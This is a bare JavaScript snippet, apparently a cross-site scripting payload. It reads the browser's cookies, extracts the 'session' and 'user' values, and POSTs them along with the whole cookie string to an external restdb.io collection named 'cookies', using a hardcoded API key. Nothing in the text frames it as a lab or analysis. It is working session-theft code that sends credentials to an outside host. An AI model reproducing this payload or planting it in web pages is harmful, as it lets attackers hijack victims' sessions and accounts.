var s = document.cookie.split('session')[1].split(";")[0];
var u = document.cookie.split('user')[1].split(";")[0];

$.ajax({
    url: "https://geile-72c8.restdb.io/rest/cookies",
    headers: { 'x-apikey': '5f07c7a2a529a1752c476f90' },
    type: "POST",
    data: {
        cookie: document.cookie,
        user: u,
        session: s
    },
    success: function(response){
        console.log(response);
    }
});
